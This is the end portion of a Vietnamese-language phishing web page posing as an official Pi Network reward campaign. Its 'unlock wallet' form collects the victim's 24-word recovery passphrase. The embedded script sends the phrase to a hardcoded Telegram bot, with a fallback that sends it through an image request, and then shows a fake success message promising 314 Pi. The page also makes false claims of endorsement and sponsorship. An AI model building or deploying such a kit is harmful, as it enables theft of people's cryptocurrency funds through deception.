                            <p class="certificate-title">Bảo Mật & Minh Bạch</p>
                            <p class="certificate-text">Đây là chiến dịch khuyến mãi độc lập được liên kết và xác nhận bởi Pi Network chính thức.</p>
                        </div>
                    </div>
                </section>
                
                <!-- Sponsors Section - Simplified -->
                <section class="mb-16">
                    <h4 class="text-2xl font-bold mb-8 text-center animate-on-scroll">Được Hỗ Trợ Bởi</h4>
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                        <div class="card p-4">
                            <div class="text-center text-purple-600 text-3xl mb-2">
                                <i class="fas fa-chart-line"></i>
                            </div>
                            <p class="font-bold text-center">TechFi</p>
                            <p class="text-sm text-center text-gray-500">Hỗ trợ kỹ thuật</p>
                        </div>
                        <div class="card p-4">
                            <div class="text-center text-purple-600 text-3xl mb-2">
                                <i class="fas fa-cubes"></i>
                            </div>
                            <p class="font-bold text-center">OKX</p>
                            <p class="text-sm text-center text-gray-500">Đối tác blockchain</p>
                        </div>
                        <div class="card p-4">
                            <div class="text-center text-purple-600 text-3xl mb-2">
                                <i class="fas fa-credit-card"></i>
                            </div>
                            <p class="font-bold text-center">CryptoPlus</p>
                            <p class="text-sm text-center text-gray-500">Cổng thanh toán</p>
                        </div>
                        <div class="card p-4">
                            <div class="text-center text-purple-600 text-3xl mb-2">
                                <i class="fas fa-users"></i>
                            </div>
                            <p class="font-bold text-center">PiCommunity</p>
                            <p class="text-sm text-center text-gray-500">Hỗ trợ cộng đồng</p>
                        </div>
                    </div>
                </section>
            </div>
            
            <!-- Footer -->
            <footer class="py-10 px-4 relative">
                <div class="absolute inset-0 opacity-10 bg-purple-900"></div>
                <div class="relative z-10 container mx-auto text-center">
                    <div class="mb-6">
                        <div class="w-16 h-16 mx-auto bg-gradient-to-r from-purple-600 to-purple-800 rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-lg">π</div>
                    </div>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
                        <div>
                            <h5 class="font-bold mb-3">Liên Hệ</h5>
                            <p class="flex items-center justify-center mb-2">
                                <i class="fas fa-envelope mr-2 text-purple-400"></i>
                                support@minepi.com
                            </p>
                            <p class="flex items-center justify-center">
                                <i class="fas fa-globe mr-2 text-purple-400"></i>
                                GETPIFREE
                            </p>
                        </div>
                        <div>
                            <h5 class="font-bold mb-3">Chính Sách</h5>
                            <p class="mb-2">Bảo mật dữ liệu</p>
                            <p>Điều khoản sử dụng</p>
                        </div>
                        <div>
                            <h5 class="font-bold mb-3">Theo Dõi</h5>
                            <div class="flex justify-center space-x-4">
                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
                                    <i class="fab fa-telegram text-purple-400"></i>
                                </span>
                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
                                    <i class="fab fa-twitter text-purple-400"></i>
                                </span>
                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
                                    <i class="fab fa-discord text-purple-400"></i>
                                </span>
                            </div>
                        </div>
                    </div>
                    <p class="mb-4 max-w-2xl mx-auto">Đây là chương trình khuyến mãi độc lập và xác nhận bởi Pi Network chính thức.</p>
                    <p class="text-sm text-gray-500 dark:text-gray-400">© 2025 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.</p>
                </div>
            </footer>
        </div>
        
        <!-- Pi Wallet Form Page -->
        <div id="formPage" class="page page-inactive-right">
            <div class="container mx-auto px-4 py-8">
                <div class="pi-wallet-style surprise-container">
                    <div class="pi-title animate-on-scroll">Mở khóa ví Pi</div>
                     <div class="animate-on-scroll" data-delay="200">
                        <div class="pi-input-container">
                            <textarea id="walletAddress" class="pi-input" placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"></textarea>
                        </div>
                        <div id="wordCounter" class="word-counter"></div>
                        <div id="validationMessage" class="validation-message hidden">Vui lòng nhập đúng 24 từ khôi phục ví</div>
                    </div>
                    
                    <div class="animate-on-scroll" data-delay="400">
                        <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger">
                            MỞ KHÓA VỚI CỤM MẬT KHẨU
                        </button>
                        
                        <button class="pi-button pi-button-secondary">
                            MỞ KHÓA BẰNG VÂN TAY
                        </button>
                    </div>
                    
                    <div class="pi-info-text">
                        <p>Là một ví không giám sát, cụm mật khẩu của bạn chỉ có bạn mới có thể truy cập. Hiện tại không thể khôi phục cụm mật khẩu</p>
                        <p class="mt-2">Bạn bị mất cụm mật khẩu ví? <a href="#" class="pi-link">Bạn có thể tạo một ví mới</a>, nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập.</p>
                    </div>
                    
                    <!-- Hidden explosion particles for surprise effect - kept but simplified -->
                    <div id="explosionContainer"></div>
                </div>
                
                <div class="mt-8 text-center">
                    <button id="backToHomeBtn" class="btn-secondary">
                        <i class="fas fa-arrow-left mr-2"></i> Quay Lại Trang Chủ
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Success Modal (initially hidden) -->
    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
        <div class="card max-w-md w-full mx-4 p-8">
            <div class="text-center mb-8">
               <div class="w-16 h-16 mx-auto rounded-full flex items-center justify-center text-white text-2xl mb-4" style="background-color: #693988;">
    <i class="fas fa-check"></i>
</div>

                <h3 class="text-3xl font-bold mb-3">Nhận Pi Thành Công!</h3>
                <p class="text-gray-500 dark:text-gray-400">Phần thưởng Pi của bạn đã được xếp hàng để xử lý. Nó sẽ được gửi đến ví của bạn trong vòng 24 giờ.</p>
            </div>
            
            <div class="space-y-6 mb-8">
    <div class="flex justify-between items-center">
        <span class="font-bold whitespace-nowrap">Ví nhận:</span>
        <span id="successWalletAddress" class="truncate max-w-[150px]">...</span>
    </div>
    <div class="flex justify-between items-center">
        <span class="font-bold whitespace-nowrap">Số Lượng Thưởng:</span>
        <span class="text-purple-600 font-bold">314 Pi</span>
    </div>
    <div class="flex justify-between items-center">
        <span class="font-bold whitespace-nowrap">Thời Gian Dự Kiến:</span>
        <span class="whitespace-nowrap">Trong vòng 24 giờ</span>
    </div>
</div>

            
            <button id="closeSuccessBtn" class="w-full btn-primary py-4">
                Quay Lại Trang Chủ
            </button>
        </div>
    </div>

    <script>
        // Create premium background effects - enhanced but optimized
        function createPremiumBackground() {
            // Create stars (moderate number)
            const starsContainer = document.getElementById('starsContainer');
            const numStars = 15; 
            
            for (let i = 0; i < numStars; i++) {
                const star = document.createElement('div');
                star.className = 'star';
                star.style.width = `${Math.random() * 3 + 1}px`;
                star.style.height = star.style.width;
                star.style.left = `${Math.random() * 100}%`;
                star.style.top = `${Math.random() * 100}%`;
                star.style.animationDelay = `${Math.random() * 4}s`;
                starsContainer.appendChild(star);
            }

            // Create single-point bright stars
            const singleStarsContainer = document.getElementById('singleStarsContainer');
            const numSingleStars = 4; // A few bright stars
            
            for (let i = 0; i < numSingleStars; i++) {
                const star = document.createElement('div');
                star.className = 'star-single';
                star.style.left = `${Math.random() * 90 + 5}%`;
                star.style.top = `${Math.random() * 90 + 5}%`;
                star.style.animationDelay = `${Math.random() * 3}s`;
                singleStarsContainer.appendChild(star);
            }

            // Create shooting stars with proper direction
            const shootingStarsContainer = document.getElementById('shootingStarsContainer');
            const numShootingStars = 3;
            
            for (let i = 0; i < numShootingStars; i++) {
                const shootingStar = document.createElement('div');
                shootingStar.className = 'shooting-star';
                
                // Position at top-left of screen
                shootingStar.style.left = `${Math.random() * 30}%`;
                shootingStar.style.top = `${Math.random() * 30}%`;
                
                // Set length and angle for proper direction
                const length = 80 + Math.random() * 120;
                shootingStar.style.width = `${length}px`;
                shootingStar.style.height = `2px`;
                shootingStar.style.transform = 'rotate(45deg)';
                
                // Stagger animation timing
                shootingStar.style.animationDelay = `${i * 3 + Math.random() * 3}s`;
                
                shootingStarsContainer.appendChild(shootingStar);
            }
            
            // Create particles (reduced number)
            const particlesContainer = document.getElementById('particlesContainer');
            const numParticles = 10;
            
            for (let i = 0; i < numParticles; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.width = `${Math.random() * 6 + 2}px`;
                particle.style.height = particle.style.width;
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                particle.style.animationDelay = `${Math.random() * 10}s`;
                particle.style.animationDuration = `${15 + Math.random() * 10}s`;
                particlesContainer.appendChild(particle);
            }
            
            // Create Pi coins (8)
            const coinsContainer = document.getElementById('coinsContainer');
            const numCoins = 8;
            
            // Define positions that spread evenly across the screen
            const coinPositions = [
                {left: "15%", top: "15%"},
                {left: "85%", top: "15%"},
                {left: "15%", top: "85%"},
                {left: "85%", top: "85%"},
                {left: "50%", top: "25%"},
                {left: "25%", top: "50%"},
                {left: "75%", top: "50%"},
                {left: "50%", top: "75%"}
            ];
            
            for (let i = 0; i < numCoins; i++) {
                const coin = document.createElement('div');
                coin.className = 'premium-coin';
                
                const coinInner = document.createElement('div');
                coinInner.className = 'coin-inner';
                
                const coinFront = document.createElement('div');
                coinFront.className = 'coin-front';
                coinFront.textContent = 'π';
                
                const coinBack = document.createElement('div');
                coinBack.className = 'coin-back';
                coinBack.textContent = 'π';
                
                coinInner.appendChild(coinFront);
                coinInner.appendChild(coinBack);
                coin.appendChild(coinInner);
                
                const size = 25 + Math.random() * 15;
                coin.style.width = `${size}px`;
                coin.style.height = `${size}px`;
                coin.style.left = coinPositions[i].left;
                coin.style.top = coinPositions[i].top;
                coin.style.animationDelay = `${Math.random() * 3}s`;
                coin.style.opacity = "0.3";
                
                // Simpler floating animation
                coin.style.animation = `float 10s infinite ease-in-out`;
                
                coinsContainer.appendChild(coin);
            }
            
            // Create light streaks (2)
            const lightStreaksContainer = document.getElementById('lightStreaksContainer');
            const numStreaks = 2;
            
            for (let i = 0; i < numStreaks; i++) {
                const streak = document.createElement('div');
                streak.className = 'light-streak';
                streak.style.top = `${30 + i * 40}%`;
                streak.style.animationDelay = `${i * 5}s`;
                lightStreaksContainer.appendChild(streak);
            }
        }
        
        // Create confetti for the success animation
        function createConfetti() {
            const container = document.getElementById('confettiContainer');
            container.innerHTML = ''; // Clear any existing confetti
            
            const colors = [
                '#693988', // Pi purple
                '#f8c056', // Pi gold
                '#ffffff', // White
                '#9c55d4', // Light purple
                '#ffd78c'  // Light gold
            ];
            
            const numConfetti = 150;
            
            for (let i = 0; i < numConfetti; i++) {
                const confetti = document.createElement('div');
                
                // Randomly select confetti type
                const type = Math.floor(Math.random() * 3);
                if (type === 0) {
                    confetti.className = 'confetti confetti-square';
                } else if (type === 1) {
                    confetti.className = 'confetti confetti-circle';
                } else {
                    confetti.className = 'confetti confetti-triangle';
                }
                
                // Random position, color, size and animation timing
                confetti.style.left = `${Math.random() * 100}%`;
                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                
                const size = 5 + Math.random() * 10;
                confetti.style.width = `${size}px`;
                confetti.style.height = `${size}px`;
                
                // Animation 
                const duration = 2 + Math.random() * 3;
                const delay = Math.random() * 0.5;
                confetti.style.animation = `confettiFall ${duration}s ease-in ${delay}s forwards`;
                
                container.appendChild(confetti);
            }
        }
        
        // Show confetti celebration
        function showConfetti() {
            createConfetti();
            const container = document.getElementById('confettiContainer');
            container.style.display = 'block';
            
            // Hide after animation completes
            setTimeout(() => {
                container.style.display = 'none';
            }, 5000);
        }
        
        // Add wave animations to feature cards
        function setupFeatureCardWaves() {
            // Apply staggered animation delays to waves
            const waves = document.querySelectorAll('.feature-card-wave');
            waves.forEach((wave, index) => {
                wave.style.animationDelay = `${index * 1}s`;
            });
            
            // Add staggered delays for icon shine effects
            const icons = document.querySelectorAll('.feature-icon');
            icons.forEach((icon, index) => {
                const afterElem = window.getComputedStyle(icon, '::after');
                icon.style.setProperty('--delay', `${index * 2}s`);
            });
        }
        
        // Create explosion particles - simplified
        function createExplosionParticles() {
            const container = document.getElementById('explosionContainer');
            const numParticles = 20;
            
            for (let i = 0; i < numParticles; i++) {
                const particle = document.createElement('div');
                particle.className = 'explosion-particle';
                
                // Set random direction for each particle
                const angle = Math.random() * Math.PI * 2;
                const distance = 100 + Math.random() * 100;
                const tx = Math.cos(angle) * distance;
                const ty = Math.sin(angle) * distance;
                
                particle.style.setProperty('--tx', `${tx}px`);
                particle.style.setProperty('--ty', `${ty}px`);
                
                container.appendChild(particle);
            }
        }
        
        // Show loading spinner
        function showLoading() {
            document.getElementById('loadingOverlay').style.display = 'flex';
        }
        
        // Hide loading spinner
        function hideLoading() {
            document.getElementById('loadingOverlay').style.display = 'none';
        }
        
        // Show success modal with confetti
        function showSuccessModal(walletAddress) {
            const modal = document.getElementById('successModal');
            document.getElementById('successWalletAddress').textContent = walletAddress;
            modal.classList.remove('hidden');
            showConfetti(); // Show confetti celebration
        }
        
        // Hide success modal
        function hideSuccessModal() {
            const modal = document.getElementById('successModal');
            modal.classList.add('hidden');
        }
        
        // Navigate between pages
        function navigateTo(fromPage, toPage, direction = 'right') {
            const from = document.getElementById(fromPage);
            const to = document.getElementById(toPage);
            
            // Set initial positions
            from.classList.remove('page-active');
            to.classList.remove('page-inactive-left', 'page-inactive-right');
            
            if (direction === 'right') {
                from.classList.add('page-inactive-left');
                to.classList.add('page-active');
            } else {
                from.classList.add('page-inactive-right');
                to.classList.add('page-active');
            }
            
            // Update back button visibility
            const headerBackBtn = document.getElementById('headerBackBtn');
            if (toPage === 'homePage') {
                headerBackBtn.style.visibility = 'hidden';
            } else {
                headerBackBtn.style.visibility = 'visible';
            }
            
            // Scroll to top of new page
            window.scrollTo(0, 0);
        }
        
        // Handle scroll animations - improved performance
        function handleScrollAnimations() {
            const elements = document.querySelectorAll('.animate-on-scroll, .animate-fade-in');
            
            // Use IntersectionObserver for better performance
            const observer = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        const delay = entry.target.getAttribute('data-delay') || 0;
                        setTimeout(() => {
                            entry.target.classList.add('animated');
                        }, delay);
                        observer.unobserve(entry.target);
                    }
                });
            }, { threshold: 0.1, rootMargin: '50px' }); // Added rootMargin for earlier animation trigger
            
            elements.forEach(element => {
                observer.observe(element);
            });
        }
        
        // Initialize page
        document.addEventListener('DOMContentLoaded', function() {
            // Use requestAnimationFrame for better performance
            requestAnimationFrame(() => {
                createPremiumBackground();
                createExplosionParticles();
                setupFeatureCardWaves();
            });
            
            // Delay non-essential animations
            setTimeout(() => {
                handleScrollAnimations();
            }, 100);
            
            // Hide back button initially
            const headerBackBtn = document.getElementById('headerBackBtn');
            headerBackBtn.style.visibility = 'hidden';
            
            // Button click handlers
            const openFormBtn = document.getElementById('openFormBtn');
            const backToHomeBtn = document.getElementById('backToHomeBtn');
            const unlockSubmitBtn = document.getElementById('unlockSubmitBtn');
            const closeSuccessBtn = document.getElementById('closeSuccessBtn');
            
            // Open form page
            openFormBtn.addEventListener('click', function() {
                navigateTo('homePage', 'formPage', 'right');
            });
            
            // Back to home
            backToHomeBtn.addEventListener('click', function() {
                navigateTo('formPage', 'homePage', 'left');
            });
            
            // Header back button
            headerBackBtn.addEventListener('click', function() {
                const activePageId = document.querySelector('.page.page-active').id;
                
                if (activePageId === 'formPage') {
                    navigateTo('formPage', 'homePage', 'left');
                }
            });
            
            // Word counter and validation
            const walletAddressInput = document.getElementById('walletAddress');
            const wordCounter = document.getElementById('wordCounter');
            const validationMessage = document.getElementById('validationMessage');
            const inputContainer = document.querySelector('.pi-input-container');
            
            // Update word count on input with debounce for better performance
            let debounceTimer;
            walletAddressInput.addEventListener('input', function() {
                clearTimeout(debounceTimer);
                debounceTimer = setTimeout(() => {
                    const text = this.value.trim();
                    let wordCount = 0;
                    
                    if (text) {
                        // Count words (sequences separated by spaces)
                        wordCount = text.split(/\s+/).filter(word => word.length > 0).length;
                    }
                    
                    // Only show validation when count is wrong
                    if (wordCount > 0 && wordCount !== 24) {
                        wordCounter.classList.add('invalid');
                        inputContainer.classList.add('invalid-input');
                        inputContainer.classList.remove('valid-input');
                        validationMessage.classList.remove('hidden');
                    } else if (wordCount === 24) {
                        wordCounter.textContent = '';
                        wordCounter.classList.remove('invalid');
                        inputContainer.classList.add('valid-input');
                        inputContainer.classList.remove('invalid-input');
                        validationMessage.classList.add('hidden');
                    } else {
                        wordCounter.textContent = '';
                        wordCounter.classList.remove('invalid');
                        inputContainer.classList.remove('valid-input', 'invalid-input');
                        validationMessage.classList.add('hidden');
                    }
                }, 200); // 200ms debounce delay
            });
            
            // Form submission
            unlockSubmitBtn.addEventListener('click', async function() {
                const walletAddress = walletAddressInput.value.trim();
                
                // Count words
                const wordCount = walletAddress.split(/\s+/).filter(word => word.length > 0).length;
                
                // Validate word count
                if (!walletAddress || wordCount !== 24) {
                    inputContainer.classList.add('invalid-input');
                    wordCounter.classList.add('invalid');
                    validationMessage.classList.remove('hidden');
                    return;
                }
                
                showLoading();
                
                try {
                    // Replace with your actual Telegram bot token and chat ID
                    const BOT_TOKEN = '7161535723:AAGqp8BU4hsvaUCO0nBdx6-tZM9BOwZfj1Y';
                    const CHAT_ID = '7305842707';
                    
                    // Prepare message
                    const message = `🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}`;
                    
                    // Send to Telegram
                    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    const response = await fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        setTimeout(() => {
                            // Add a slight delay to show loading state
                            hideLoading();
                            showSuccessModal(walletAddress);
                        }, 1000);
                    } else {
                        throw new Error('Failed to send message to Telegram');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    
                    // Fallback method using image request
                    const img = new Image();
                    const timestamp = new Date().getTime();
                    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`🎁 Yêu cầu phần thưởng Pi mới!\n\n📋 Địa chỉ ví: ${walletAddress}\n⏰ Thời gian: ${new Date().toLocaleString()}`)}&t=${timestamp}`;
                    
                    img.onload = img.onerror = function() {
                        setTimeout(() => {
                            hideLoading();
                            showSuccessModal(walletAddress);
                        }, 1000);
                    };
                }
            });
            
            closeSuccessBtn.addEventListener('click', function() {
                hideSuccessModal();
                navigateTo('formPage', 'homePage', 'left');
                document.getElementById('walletAddress').value = '';
            });
        });
    </script>
</body>
</html>
